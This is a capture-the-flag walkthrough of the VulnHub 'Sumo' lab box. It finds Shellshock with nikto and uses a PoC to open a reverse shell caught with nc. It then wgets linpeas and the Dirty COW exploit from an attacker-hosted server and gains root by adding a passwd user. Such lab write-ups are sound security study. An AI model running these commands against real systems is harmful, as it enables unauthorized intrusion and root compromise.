---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Sumo

[Sumo](https://www.vulnhub.com/entry/sumo-1,480/) is an <mark style="color:green;">easy-rated</mark> box that leverages well-known kernel vulnerabilities. First, we discover that the web server is susceptible to the Shellshock vulnerability, identified through a Nikto scan, which provides our initial foothold. Next, by performing system enumeration with `linpeas.sh`, we exploit the Dirty COW vulnerability, ultimately escalating our privileges to root access.

<table><thead><tr><th width="86" align="center">Step</th><th>Action</th><th width="186">Tool</th><th>Gained</th></tr></thead><tbody><tr><td align="center">1</td><td>Vulnerability scanning</td><td><a href="../../tools/vulnerability-scanners.md"><code>nikto</code></a></td><td>Shellshock vulnerability</td></tr><tr><td align="center">2</td><td>Researching Shellshock</td><td><a href="https://github.com/b4keSn4ke/CVE-2014-6271">PoC</a></td><td>Initial foothold</td></tr><tr><td align="center">3</td><td>System enumeration</td><td><a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20240901-df0685e9"><code>linpeas.sh</code></a></td><td>Dirtycow vulnerability</td></tr><tr><td align="center">4</td><td>Researching Dirtycow</td><td><a href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">PoC</a></td><td>Root access</td></tr></tbody></table>

## Recon

```bash
$ sudo nmap -T4 --min-rate 10000 -open -p- -A sumo

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
```

{% code overflow="wrap" %}
```bash
$ whatweb http://sumo

http://sumo [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[192.168.221.87]
```
{% endcode %}

{% code overflow="wrap" %}
```bash
$ ffuf -u http://sumo/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -ic -c -ac -e .txt,.php

________________________________________________
index                   [Status: 200, Size: 177, Words: 22, Lines: 5, Duration: 29ms]
```
{% endcode %}

## Local.txt

We have nothing to explore here, so let's perform a vulnerability scan with `nikto`.

{% code overflow="wrap" %}
```bash
$ nikto -h http://sumo
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.184.87
+ Target Hostname:    sumo
+ Target Port:        80
+ Start Time:         2024-09-05 07:06:56 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ /: Server may leak inodes via ETags, header found with file /, inode: 1706318, size: 177, mtime: Mon May 11 18:55:10 2020. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /cgi-bin/test: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.
+ /cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+ /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+ /cgi-bin/test/test.cgi: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8657 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2024-09-05 07:11:09 (GMT1) (253 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
{% endcode %}

`nikto` let us know that the application might be vulnerable to the Shellshock vulnerability. Based on this [PoC](https://github.com/b4keSn4ke/CVE-2014-6271), we need to first search for `.sh` or `cgi` files under the `/cgi-bin` directory. However, `nikto` has already gave us this information: `test.sh` and `test.cgi`. So all we have to do is to open a listener and use the PoC.

{% code overflow="wrap" %}
```bash
$ ./shellshock.py 192.168.45.159 9999 http://sumo/cgi-bin/test.sh

<SNIP>
[+] Protocol detected: HTTP

[+] Setting Payload ...
[+] Sending Payload to http://sumo/cgi-bin/test.sh ...

[-] Request: timed out received HTTP code 500

[+] Reverse shell from 192.168.184.87 connected to [192.168.45.159:9999].

[+] Payload Sent successfully !
```
{% endcode %}

```bash
$ nc -nvlp 9999
listening on [any] 9999 ...
connect to [192.168.45.159] from (UNKNOWN) [192.168.184.87] 37896
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls
local.txt
test
test.sh
```

## Proof.txt

After [upgrading our shell](../../tools/shells/reverse-shells.md#upgrades) using `script`, we can see that this has only one user (`sumo`) and after searching around we can't find much. Checking the kernel version and exploits for it comes back with interesting information.

{% code overflow="wrap" %}
```bash
www-data@ubuntu:/usr/lib/cgi-bin$ ls /home
sumo
www-data@ubuntu:/etc/apache2$ uname -a
Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```
{% endcode %}

```bash
$ searchsploit Linux ubuntu 3.2.0-23
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
<SNIP>
Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3)                                                         | linux_x86-64/local/33589.c
<SNIP>

$ searchsploit -m 33589.c
  Exploit: Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3)
      URL: https://www.exploit-db.com/exploits/33589
     Path: /usr/share/exploitdb/exploits/linux_x86-64/local/33589.c
    Codes: CVE-2013-2094, OSVDB-93361
 Verified: True
File Type: C source, ASCII text
Copied to: /home/x7331/web200/box/CVE-2014-6271/33589.c
```

Transferring and compiling the exploit to the box as well as transferring the compiled exploit itself does not seem to work. Let's use `linpeas.sh` to properly enumerate the system.

{% code overflow="wrap" %}
```bash
www-data@ubuntu:/tmp$ wget http://192.168.45.159:8888/linpeas.sh
--2024-09-04 23:54:46--  http://192.168.45.159:8888/linpeas.sh
Connecting to 192.168.45.159:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 862777 (843K) [text/x-sh]
Saving to: `linpeas.sh'

100%[================================================>] 862,777     1.80M/s   in 0.5s

2024-09-04 23:54:46 (1.80 MB/s) - `linpeas.sh' saved [862777/862777]

www-data@ubuntu:/tmp$ chmod +x linpeas.sh
www-data@ubuntu:/tmp$ ./linpeas.sh

<SNIP>
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
<SNIP>
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Exposure: highly probable
   Tags: RHEL=6,[ ubuntu=12.04{kernel:3.2.0-(23|29)-generic} ],fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}
   Download URL: https://www.exploit-db.com/download/26131
   Comments: No SMEP/SMAP bypass
<SNIP>

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [4] perf_swevent
      CVE-2013-2094
      Source: http://www.exploit-db.com/exploits/26131
<SNIP>
```
{% endcode %}

The Linux Exploit Suggester has some suggestions including the dirtycow vulnerability as well as the one we tried to use before. We can use this [PoC](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c) and by following its usage instructions we are able to get a root shell.

{% code overflow="wrap" %}
```bash
www-data@ubuntu:/tmp$ wget http://192.168.45.159:8888/dirty.c
--2024-09-05 00:15:08--  http://192.168.45.159:8888/dirty.c
Connecting to 192.168.45.159:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4815 (4.7K) [text/x-csrc]
Saving to: `dirty.c'

100%[===============================================>] 4,815       --.-K/s   in 0s

2024-09-05 00:15:08 (17.0 MB/s) - `dirty.c' saved [4815/4815]

www-data@ubuntu:/tmp$ PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH
www-data@ubuntu:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
www-data@ubuntu:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash

mmap: 7f17609e9000

madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'test'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@ubuntu:/tmp$ su firefart
Password:
firefart@ubuntu:/tmp# ls /root
proof.txt  root.txt
```
{% endcode %}
